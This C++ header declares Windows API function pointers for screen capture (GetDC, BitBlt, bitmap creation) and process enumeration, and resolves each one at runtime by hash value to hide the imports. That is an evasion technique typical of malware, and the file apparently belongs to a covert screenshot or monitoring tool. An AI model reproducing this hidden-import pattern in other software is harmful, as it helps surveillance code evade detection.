#pragma once
#include "HashModule.h"


using customOpenProcess = HANDLE(NTAPI*)(
    DWORD dwDesiredAccess,
    BOOL bInheritHandle,
    DWORD dwProcessId
    );

using customCloseHandle = BOOL(NTAPI*)(
    HANDLE hObject
    );

using customGetSystemMetrics = int(NTAPI*)(
    int nIndex
    );

using customGetDC = HDC(NTAPI*)(
    _In_opt_ HWND hWnd
    );

using customCreateCompatibleDC = HDC(NTAPI*)(
    HDC hdc
);

using customGetDeviceCaps = int(NTAPI*)(
    HDC hdc, 
    int index
    );

using customCreateCompatibleBitmap = HBITMAP(NTAPI*)(
    HDC hdc,
    int cx,
    int cy
    );

using customSelectObject = HGDIOBJ(NTAPI*)(
    HDC hdc,
    HGDIOBJ h
    );

using customBitBlt = BOOL(NTAPI*)(
    HDC hdc,
    int x,
    int y,
    int cx,
    int cy,
    HDC hdcSrc,
    int x1,
    int y1,
    DWORD rop
    );

using customDeleteDC = BOOL(NTAPI*)(
    HDC hdc
    );

using customGlobalLock = LPVOID(NTAPI*)(
    HGLOBAL hMem
    );

using customGlobalUnlock = BOOL(NTAPI*)(
    HGLOBAL hMem
    );

using customEnumProcessModules = BOOL(NTAPI*)(
    HANDLE hProcess,
    HMODULE* lphModule,
    DWORD cb,
    LPDWORD lpcbNeeded
);

using customGetModuleBaseNameW = DWORD(NTAPI*)(
    HANDLE hProcess,
    HMODULE hModule,
    LPWSTR lpBaseName,
    DWORD nSize
);

using customEnumProcesses = BOOL(NTAPI*)(
    DWORD* lpidProcess,
    DWORD cb,
    LPDWORD lpcbNeeded
);

customOpenProcess OpenProcess_c = (customOpenProcess)getFunctionAddressByHash((char*)"Kernel32", 0x50b2e0af);
customCloseHandle CloseHandle_c = (customCloseHandle)getFunctionAddressByHash((char*)"Kernel32", 0x120c0655);
customGetSystemMetrics GetSystemMetrics_c = (customGetSystemMetrics)getFunctionAddressByHash((char*)"User32", 0xed1d616f);
customGetDC GetDC_c = (customGetDC)getFunctionAddressByHash((char*)"User32", 0xed1c5b53);
customCreateCompatibleDC CreateCompatibleDC_c = (customCreateCompatibleDC)getFunctionAddressByHash((char*)"Gdi32", 0xd6938e23);
customGetDeviceCaps GetDeviceCaps_c = (customGetDeviceCaps)getFunctionAddressByHash((char*)"Gdi32", 0xed66d703);
customCreateCompatibleBitmap CreateCompatibleBitmap_c = (customCreateCompatibleBitmap)getFunctionAddressByHash((char*)"Gdi32", 0x61ead0e4);
customSelectObject SelectObject_c = (customSelectObject)getFunctionAddressByHash((char*)"Gdi32", 0xbe990130);
customBitBlt BitBlt_c = (customBitBlt)getFunctionAddressByHash((char*)"Gdi32", 0xfc635fc4);
customDeleteDC DeleteDC_c = (customDeleteDC)getFunctionAddressByHash((char*)"Gdi32", 0x2da55f23);
customGlobalLock GlobalLock_c = (customGlobalLock)getFunctionAddressByHash((char*)"Kernel32", 0xbb8afa47);
customGlobalUnlock GlobalUnlock_c = (customGlobalUnlock)getFunctionAddressByHash((char*)"Kernel32", 0x1ae67447);
customEnumProcessModules EnumProcessModules_c = (customEnumProcessModules)getFunctionAddressByHash((char*)"Psapi", 0x9158ada7);
customGetModuleBaseNameW GetModuleBaseNameW_c = (customGetModuleBaseNameW)getFunctionAddressByHash((char*)"Psapi", 0x43bc7f9b);
customEnumProcesses EnumProcesses_c = (customEnumProcesses)getFunctionAddressByHash((char*)"Psapi", 0xfaf76d97);